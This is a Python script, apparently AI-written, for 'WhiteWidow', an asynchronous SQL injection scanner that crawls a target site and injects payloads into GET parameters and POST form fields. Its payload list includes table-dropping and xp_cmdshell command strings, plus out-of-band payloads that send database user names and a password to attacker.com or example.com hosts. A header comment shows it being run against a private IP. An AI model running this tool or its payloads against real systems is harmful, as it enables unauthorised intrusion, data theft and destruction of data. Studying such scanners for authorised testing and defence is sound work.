# KOMUT:   python3 pars.py 10.0.2.25 -v



#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WhiteWidow - Advanced SQL Injection Scanner
Author: AI Assistant
Version: 3.0 (Enhanced & Fixed)
"""

import argparse
import asyncio
import aiohttp
import urllib.parse
import time
import random
import re
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from difflib import SequenceMatcher

init(autoreset=True)

class WhiteWidow:
    def __init__(self, target_url, threads=10, timeout=10, verbose=False, delay=0.1):
        self.target_url = self._normalize_url(target_url)
        self.threads = threads
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.verbose = verbose
        self.delay = delay
        self.session = None
        self.vulnerable_params = []
        self.sqli_payloads = self._load_payloads()
        self.tested_params = set()
        self.crawled_urls = set()
        self.urls_to_scan = asyncio.Queue()

    def _normalize_url(self, url):
        if not re.match(r'^[a-zA-Z]+://', url):
            url = 'http://' + url
        parsed = urllib.parse.urlparse(url)
        if not parsed.path:
            url = urllib.parse.urlunparse(parsed._replace(path='/'))
        return url

    def _load_payloads(self):
        payloads = [
            "'", "\"", "`", "'--", "\"--", "`--", "'#", "\"#", "`#",
            "' OR '1'='1", "\" OR \"1\"=\"1", "` OR `1`=`1",
            "1 OR 1=1", "1' OR 1=1--", "1\" OR 1=1--", "1` OR 1=1--",
            "1 OR 'a'='a",
            " AND 1=1", " AND 1=2",
            "' AND '1'='1", "' AND '1'='2",
            ") AND (1=1", ") AND (1=2",
            "')) AND ((1=1", "')) AND ((1=2",
            " OR 1=1", " OR 1=2",
            " SLEEP(5)", " OR SLEEP(5)",
            "' SLEEP(5)", "' OR SLEEP(5)",
            "\" SLEEP(5)", "\" OR SLEEP(5)",
            "` SLEEP(5)", "` OR SLEEP(5)",
            " WAITFOR DELAY '0:0:5'",
            " PG_SLEEP(5)",
            " AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=1,0,5)))))abc)",
            " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,USER(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            " AND GTID_SUBSET(CONCAT(0x7178716b71,(SELECT (ELT(1=1,1))),0x71706a7071),1)",
            " AND EXP(~(SELECT * FROM (SELECT USER())a))",
            " AND ExtractValue(1,CONCAT(0x5c,USER()))",
            " AND UpdateXML(1,CONCAT(0x5c,USER()),1)",
            " UNION SELECT @@version,NULL,NULL",
            " OR 1=CONVERT(int, (SELECT @@version))--",
            " OR 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
            " UNION SELECT NULL,NULL,NULL--",
            " UNION SELECT 1,version(),database(),user()--",
            "; DROP TABLE users--",
            "; EXEC xp_cmdshell('dir')--",
            "; SELECT pg_terminate_backend(pg_backend_pid())--",
            " AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(USER())),'.attacker.com\\'))--",
            " AND utl_http.request('http://attacker.com/'||(SELECT USER FROM DUAL))--",
            " AND SELECT UTL_INADDR.GET_HOST_ADDRESS('subdomain.' || (SELECT password FROM users LIMIT 1) || '.example.com') FROM DUAL",
            " /*!UNION*/ /*!SELECT*/ 1,2,3--",
            " +UNION+ALL+SELECT+1,2,3--",
            "%23", "--+", "/*", "*/",
            "{'$ne':1}",
            "'; return 1==1; var x='",
        ]
        encoded_payloads = [urllib.parse.quote(p) for p in payloads]
        payloads.extend(encoded_payloads)
        return list(set(payloads))

    def _print_status(self, message, level="info"):
        colors = {
            "info": Fore.BLUE,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "debug": Fore.CYAN
        }
        if level == "debug" and not self.verbose:
            return
        print(f"{colors.get(level, Fore.WHITE)}[{level.upper()}]{Style.RESET_ALL} {message}")

    async def _fetch_url(self, url, method="GET", data=None):
        await asyncio.sleep(self.delay + random.uniform(0, 0.1))
        try:
            if method == "GET":
                async with self.session.get(url, allow_redirects=False) as response:
                    text = await response.text(errors="ignore")
                    return text, response.status
            elif method == "POST":
                async with self.session.post(url, data=data, allow_redirects=False) as response:
                    text = await response.text(errors="ignore")
                    return text, response.status
        except aiohttp.ClientError as e:
            self._print_status(f"HTTP error for {url} ({method}): {e}", "error")
        except asyncio.TimeoutError:
            self._print_status(f"Timeout for {url} ({method})", "warning")
        return None, None

    async def _extract_forms(self, url):
        html, status = await self._fetch_url(url)
        if html:
            soup = BeautifulSoup(html, 'html.parser')
            return soup.find_all('form')
        return []

    async def _test_parameter(self, url, param_name, original_value, method="GET", form_data=None):
        signature = (url, param_name, method)
        if signature in self.tested_params:
            return False
        self.tested_params.add(signature)

        original_response, original_status = None, None
        if method == "GET":
            original_response, original_status = await self._fetch_url(url)
        elif method == "POST":
            original_response, original_status = await self._fetch_url(url, method="POST", data=form_data)

        if original_response is None:
            self._print_status(f"Could not get original response for {param_name} at {url}", "warning")
            return False

        for payload in self.sqli_payloads:
            injected_url = url
            injected_data = form_data.copy() if form_data else {}

            if method == "GET":
                parsed_url = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
                query_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                injected_url = parsed_url._replace(query=new_query).geturl()
                test_response, test_status = await self._fetch_url(injected_url)
            else:
                injected_data[param_name] = payload
                test_response, test_status = await self._fetch_url(url, method="POST", data=injected_data)

            if test_response is None:
                continue

            if self._analyze_response(original_response, test_response, original_status, test_status, payload):
                vuln_info = (url, param_name, method, payload)
                if vuln_info not in self.vulnerable_params:
                    self.vulnerable_params.append(vuln_info)
                    self._print_status(f"Possible SQLi in {method} param '{param_name}' at {url} with payload: {payload[:30]}...", "success")
                    return True
        return False

    def _analyze_response(self, original_text, test_text, original_status, test_status, payload):
        errors = [
            "sql syntax", "mysql server", "syntax error", "unclosed quotation mark",
            "quoted string", "sql command", "odbc driver", "jdbc driver",
            "ole db", "sql server", "mysql", "oracle", "postgresql", "sqlite",
            "warning:", "error in your sql", "ora-", "sqlstate", "db2 sql error",
            "microsoft jet database engine error", "invalid column name", "unterminated string literal"
        ]
        test_lower = test_text.lower()
        if any(e in test_lower for e in errors):
            self._print_status(f"Error-based SQLi detected with payload: {payload[:30]}...", "debug")
            return True

        if original_status != test_status:
            self._print_status(f"Status code changed: {original_status} -> {test_status} with payload: {payload[:30]}...", "debug")
            return True

        if original_text and test_text:
            s = SequenceMatcher(None, original_text, test_text)
            ratio = s.ratio()
            if 0.05 < ratio < 0.95:
                length_diff = abs(len(original_text) - len(test_text)) / max(len(original_text), len(test_text))
                if length_diff > 0.1:
                    self._print_status(f"Content difference detected (Boolean-based?) with payload: {payload[:30]}...", "debug")
                    return True

        if any(keyword in payload.lower() for keyword in ["sleep", "benchmark", "waitfor delay", "pg_sleep"]):
            self._print_status(f"Time-based payload detected, manual check needed: {payload[:30]}...", "warning")
            return True

        return False

    async def _get_form_details(self, url, form):
        details = {}
        action = form.get('action')
        method = form.get('method', 'GET').upper()
        if action and not action.startswith('http'):
            action = urllib.parse.urljoin(url, action)
        elif not action:
            action = url
        details['action'] = action
        details['method'] = method
        details['inputs'] = []

        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_type = input_tag.get('type', 'text').lower()
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            if input_name:
                details['inputs'].append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                })
        return details

    async def _scan_url(self, url):
        self._print_status(f"Scanning {url}", "info")
        parsed = urllib.parse.urlparse(url)

        if parsed.query:
            query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param, vals in query_params.items():
                original_value = vals[0] if vals else ""
                await self._test_parameter(url, param, original_value, "GET")

        forms = await self._extract_forms(url)
        for form in forms:
            form_details = await self._get_form_details(url, form)
            if form_details['method'] == 'POST':
                form_data = {field['name']: field['value'] for field in form_details['inputs']}
                for field in form_details['inputs']:
                    param_name = field['name']
                    original_value = field['value']
                    await self._test_parameter(form_details['action'], param_name, original_value, "POST", form_data.copy())

    async def _worker(self):
        while True:
            try:
                url, depth = await self.urls_to_scan.get()

                if depth > 2:
                    self.urls_to_scan.task_done()
                    continue

                if url in self.crawled_urls:
                    self.urls_to_scan.task_done()
                    continue

                await self._scan_url(url)
                self.crawled_urls.add(url)

                # Crawl links on this page
                html, _ = await self._fetch_url(url)
                if html:
                    soup = BeautifulSoup(html, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        abs_url = urllib.parse.urljoin(url, href).split('#')[0]
                        if self.target_url in abs_url and abs_url not in self.crawled_urls:
                            await self.urls_to_scan.put((abs_url, depth + 1))

                self.urls_to_scan.task_done()
            except asyncio.CancelledError:
                break
            except Exception as e:
                self._print_status(f"Worker error: {e}", "error")
                self.urls_to_scan.task_done()

    async def start_scan(self):
        self.session = aiohttp.ClientSession(timeout=self.timeout, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
        })

        try:
            async with self.session.head(self.target_url) as resp:
                if resp.status >= 400:
                    self._print_status(f"Target returned HTTP {resp.status}", "error")
                    await self.session.close()
                    return
        except Exception as e:
            self._print_status(f"Could not connect to target: {e}", "error")
            await self.session.close()
            return

        await self.urls_to_scan.put((self.target_url, 0))

        workers = [asyncio.create_task(self._worker()) for _ in range(self.threads)]
        await self.urls_to_scan.join()

        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

        if self.vulnerable_params:
            self._print_status("Vulnerabilities found:", "success")
            for url, param, method, payload in self.vulnerable_params:
                print(f"URL: {url}")
                print(f"Parameter: {param} (Method: {method})")
                print(f"Payload: {payload}")
                print("-" * 40)
        else:
            self._print_status("No SQLi vulnerabilities found", "info")

        await self.session.close()

def main():
    parser = argparse.ArgumentParser(description="WhiteWidow - Async SQLi Scanner")
    parser.add_argument("url", help="Target URL (with or without scheme)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Concurrent workers")
    parser.add_argument("-T", "--timeout", type=int, default=15, help="Timeout seconds")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay between requests")
    args = parser.parse_args()

    scanner = WhiteWidow(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        verbose=args.verbose,
        delay=args.delay
    )
    asyncio.run(scanner.start_scan())

if __name__ == "__main__":
    main()
